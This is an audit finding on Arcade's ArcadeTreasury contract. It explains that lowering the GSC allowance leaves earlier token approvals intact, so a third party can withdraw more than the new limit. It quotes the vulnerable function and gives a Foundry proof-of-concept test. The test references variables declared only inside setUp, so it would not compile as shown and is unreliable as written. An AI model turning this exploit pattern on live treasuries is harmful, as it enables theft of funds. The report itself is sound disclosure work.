# Lines of code

https://github.com/code-423n4/2023-07-arcade/blob/f8ac4e7c4fdea559b73d9dd5606f618d4e6c73cd/contracts/ArcadeTreasury.sol#L303-L323


# Vulnerability details

## Impact
Tokens may be spent without **CORE_VOTING_ROLE** approval.

## Proof of Concept
ArcadeTreasury transfers or approves them based on invocations from governance. **GSC_CORE_VOTING_ROLE** may be authorized to spend or approve smaller amounts (`gscAllowance`) from their own voting contract, all other amounts must be authorized by full community votes.

**ADMIN_ROLE** can set the `gscAllowance` for a token by calling [setGSCAllowance(...)](https://github.com/code-423n4/2023-07-arcade/blob/f8ac4e7c4fdea559b73d9dd5606f618d4e6c73cd/contracts/ArcadeTreasury.sol#L303-L323) function:
```
    function setGSCAllowance(address token, uint256 newAllowance) external onlyRole(ADMIN_ROLE) {
        if (token == address(0)) revert T_ZeroAddress("token");
        if (newAllowance == 0) revert T_ZeroAmount();


        // enforce cool down period
        if (uint48(block.timestamp) < lastAllowanceSet[token] + SET_ALLOWANCE_COOL_DOWN) {
            revert T_CoolDownPeriod(block.timestamp, lastAllowanceSet[token] + SET_ALLOWANCE_COOL_DOWN);
        }


        uint256 spendLimit = spendThresholds[token].small;
        // new limit cannot be more than the small threshold
        if (newAllowance > spendLimit) {
            revert T_InvalidAllowance(newAllowance, spendLimit);
        }


        // update allowance state
        lastAllowanceSet[token] = uint48(block.timestamp);
        gscAllowance[token] = newAllowance;


        emit GSCAllowanceUpdated(token, newAllowance);
    }
```
However, part of `gscAllowance` may be approved to third parties and the allowance is not reset, thus tokens may be spent without **CORE_VOTING_ROLE** approval.

Consider the following scenario:
1. **GSC_CORE_VOTING_ROLE** approves 100 ether to a third party;
2. **ADMIN_ROLE** set the `gscAllowance` to 80 ether;
3. Third party pulls 100 ether from treasury, results in 20 ether being spent without **CORE_VOTING_ROLE** approval.

Please see the tests:
```
contract ArcadeTreasuryTest is Test {
    address timelock = address(1);
    address coreVoting = address(2);
    address gscCoreVoting = address(3);
    address other = address(4);

    ArcadeTreasury treasury;
    MockToken mockToken;

    function setUp() public {
        treasury = new ArcadeTreasury(timelock);

        vm.startPrank(timelock);
        treasury.grantRole(treasury.CORE_VOTING_ROLE(), coreVoting);
        treasury.grantRole(treasury.GSC_CORE_VOTING_ROLE(), gscCoreVoting);

        mockToken = new MockToken("Mock Token", "MT");
        IArcadeTreasury.SpendThreshold memory threshold = IArcadeTreasury.SpendThreshold(100 ether, 200 ether, 300 ether);
        treasury.setThreshold(address(mockToken), threshold);
        vm.stopPrank();

        uint256 gscAllowance = 100 ether;

        mockToken.mint(address(treasury), 300 ether);
        uint256 treasuryBalanceBefore = mockToken.balanceOf(address(treasury));
        assertEq(treasuryBalanceBefore, 300 ether);

        vm.warp(7 days);
        vm.prank(timelock);
        treasury.setGSCAllowance(address(mockToken), gscAllowance);
    }

    function testDecreaseGscAllowance() public {
        vm.prank(gscCoreVoting);
        treasury.gscApprove(address(mockToken), other, gscAllowance);

        vm.warp(14 days);
        uint256 gscAllowanceNew = 80 ether;

        vm.prank(timelock);
        treasury.setGSCAllowance(address(mockToken), gscAllowanceNew);

        vm.prank(other);
        mockToken.transferFrom(address(treasury), other, gscAllowance);

        uint256 treasuryBalanceAfter = mockToken.balanceOf(address(treasury));
        assertTrue(treasuryBalanceAfter < treasuryBalanceBefore - gscAllowanceNew);
        assertEq(mockToken.balanceOf(address(treasury)), 200 ether);
    }

}

contract MockToken is ERC20 {

    constructor(string memory name_, string memory symbol_) ERC20(name_, symbol_) {}

    function mint(address account, uint256 amount) public {
        _mint(account, amount);
    }
}
```

